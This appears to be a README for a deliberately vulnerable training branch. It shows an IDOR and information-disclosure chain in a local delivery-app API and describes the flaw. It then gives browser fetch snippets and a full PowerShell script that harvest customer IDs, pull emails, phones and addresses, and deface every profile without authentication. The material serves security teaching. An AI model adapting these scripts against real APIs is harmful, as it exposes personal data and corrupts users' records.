# IDOR and Information Disclosure Vulnerability Demo

## Overview

Branch: vulnerability/idor

This branch demonstrates an **Insecure Direct Object Reference (IDOR)** vulnerability combined with **Information Disclosure**. The application exposes sensitive customer identifiers through public review endpoints, then allows unauthenticated access to customer data. This is a classic two-stage attack: first discover internal identifiers through information leakage, then exploit missing authorization to access/modify resources.

## What is IDOR?

Insecure Direct Object Reference (IDOR) occurs when an application exposes references to internal objects (like database IDs) and fails to verify that the user is authorized to access those objects. Attackers can manipulate these references to access data belonging to other users.

## The Vulnerability Chain

1. **Information Disclosure**: Review endpoints return the full `DeliveryReview` entity instead of a DTO, exposing `CustomerId` and `DeliveryId` fields
2. **Missing Authentication**: Customer endpoints don't require authentication
3. **Missing Authorization**: Customer endpoints don't verify resource ownership or role-based permissions

## Attack Samples

### Attack 1: Manual Browser-Based Exploitation

This attack demonstrates how an unauthenticated attacker can harvest customer IDs and access private customer information using only the browser's DevTools.

#### Step 1: Discover Customer IDs

First, get a pilot id from the pilots endpoint: http://localhost:5110/api/v1/pilots

**Request to paste into browser:**

```javascript
fetch("http://localhost:5110/api/reviews/pilot/{YOUR_PILOT_ID}")
  .then((response) => response.json())
  .then((data) => {
    console.log("Reviews found:", data.totalCount);
    console.log("Customer IDs exposed:");
    data.items.forEach((review) => {
      console.log(
        `  Customer: ${review.customerId}, Delivery: ${review.deliveryId}`
      );
    });
  });
```

**What happens:**

- No authentication required
- Returns all reviews for the pilot
- Each review contains `customerId` and `deliveryId` fields
- These IDs are supposed to be private

**Example Response:**

```json
{
  "items": [
    {
      "id": "a1b2c3d4-...",
      "pilotId": "00000000-0000-0000-0000-000000000001",
      "customerId": "f47ac10b-58cc-4372-a567-0e02b2c3d479",
      "deliveryId": "e8d1f2a3-...",
      "rating": 5,
      "notes": "Great pilot!",
      "createdAt": "2024-01-15T10:30:00Z"
    }
  ],
  "totalCount": 1,
  "skip": 0,
  "take": 5
}
```

#### Step 2: Access Customer Data

Now take any `customerId` from the previous response and access that customer's private information:

**Request to paste into browser:**

```javascript
fetch(`http://localhost:5110/api/customers/${YOUR_STOLEN_CUSTOMER_ID}`)
  .then((response) => response.json())
  .then((customer) => {
    console.log("STOLEN CUSTOMER DATA:");
    console.log("  Email:", customer.email);
    console.log("  Nickname:", customer.nickname);
    console.log("  Phone:", customer.phone);
    console.log("  Address:", customer.address);
  });
```

**What happens:**

- No authentication required
- Returns complete customer profile
- Includes PII: email, phone, address
- Should require authentication + authorization check

---

### Attack 2: Automated Mass Exploitation

This PowerShell script automates the discovery and exploitation at scale, harvesting customer IDs from reviews and defacing all customer profiles.

**PowerShell script to save and run:**

```powershell
$apiBase = "http://localhost:5110/api"
$pilotIds = @(
    "00000000-0000-0000-0000-000000000001",
    "00000000-0000-0000-0000-000000000002",
    "00000000-0000-0000-0000-000000000003"
)

$defacementNickname = "PWNED_USER_$(Get-Random -Minimum 1000 -Maximum 9999)"

Write-Host "=== IDOR Mass Exploitation Script ===" -ForegroundColor Red
Write-Host ""

$harvestedCustomers = @{}

Write-Host "[Phase 1] Harvesting Customer IDs from public review endpoints..." -ForegroundColor Yellow
Write-Host ""

foreach ($pilotId in $pilotIds) {
    Write-Host "  Scanning reviews for Pilot: $pilotId" -ForegroundColor Cyan

    try {
        $reviewsUrl = "$apiBase/reviews/pilot/$pilotId"
        $reviewsResponse = Invoke-RestMethod -Uri $reviewsUrl -Method Get

        Write-Host "    Found $($reviewsResponse.totalCount) reviews" -ForegroundColor Gray

        foreach ($review in $reviewsResponse.items) {
            if (-not $harvestedCustomers.ContainsKey($review.customerId)) {
                $harvestedCustomers[$review.customerId] = @{
                    "CustomerId" = $review.customerId
                    "DiscoveredVia" = "Pilot $pilotId Review $($review.id)"
                    "DeliveryId" = $review.deliveryId
                }

                Write-Host "    [+] New Customer ID: $($review.customerId)" -ForegroundColor Green
            }
        }
    } catch {
        Write-Host "    [-] Error scanning pilot: $_" -ForegroundColor Red
    }
}

Write-Host ""
Write-Host "[Phase 2] Accessing private customer data (no auth required)..." -ForegroundColor Yellow
Write-Host ""

$customerDetails = @()

foreach ($customerId in $harvestedCustomers.Keys) {
    Write-Host "  Exfiltrating data for Customer: $customerId" -ForegroundColor Cyan

    try {
        $customerUrl = "$apiBase/customers/$customerId"
        $customer = Invoke-RestMethod -Uri $customerUrl -Method Get

        $customerDetails += $customer

        Write-Host "    Email:    $($customer.email)" -ForegroundColor Gray
        Write-Host "    Nickname: $($customer.nickname)" -ForegroundColor Gray
        Write-Host "    Phone:    $($customer.phone)" -ForegroundColor Gray
        Write-Host "    Address:  $($customer.address)" -ForegroundColor Gray
        Write-Host ""

    } catch {
        Write-Host "    [-] Error accessing customer: $_" -ForegroundColor Red
    }
}

Write-Host "[Phase 3] Mass defacement - updating all customer nicknames..." -ForegroundColor Yellow
Write-Host ""

$defacedCount = 0

foreach ($customer in $customerDetails) {
    Write-Host "  Defacing Customer: $($customer.email)" -ForegroundColor Cyan

    try {
        $updateUrl = "$apiBase/customers/$($customer.id)"
        $updateBody = @{
            nickname = "$defacementNickname"
        } | ConvertTo-Json

        $updated = Invoke-RestMethod -Uri $updateUrl -Method Put -Body $updateBody -ContentType "application/json"

        Write-Host "    [✓] Changed '$($customer.nickname)' → '$($updated.nickname)'" -ForegroundColor Green
        $defacedCount++

    } catch {
        Write-Host "    [-] Error updating customer: $_" -ForegroundColor Red
    }
}

Write-Host ""
Write-Host "=== Attack Summary ===" -ForegroundColor Red
Write-Host "  Customers Harvested: $($harvestedCustomers.Count)" -ForegroundColor White
Write-Host "  Profiles Accessed:   $($customerDetails.Count)" -ForegroundColor White
Write-Host "  Profiles Defaced:    $defacedCount" -ForegroundColor White
Write-Host ""
Write-Host "  All customer nicknames have been changed to: $defacementNickname" -ForegroundColor Red
Write-Host "  No authentication was required for any operation." -ForegroundColor Red
Write-Host ""
```

**How to use:**

1. Save as `idor-mass-exploit.ps1`
2. Ensure the API is running on `http://localhost:5110`
3. Open PowerShell terminal
4. Run: `.\idor-mass-exploit.ps1`

**What it does:**

1. **Phase 1 - Reconnaissance**: Queries public review endpoints for multiple pilots to harvest customer IDs
2. **Phase 2 - Information Disclosure**: Accesses each customer's private profile without authentication
3. **Phase 3 - Mass Defacement**: Updates all customer nicknames to a defacement message

**Impact:**

- Complete customer database enumeration
- PII exposure (emails, phones, addresses)
- Data integrity violation at scale
- No audit trail linking attacker identity
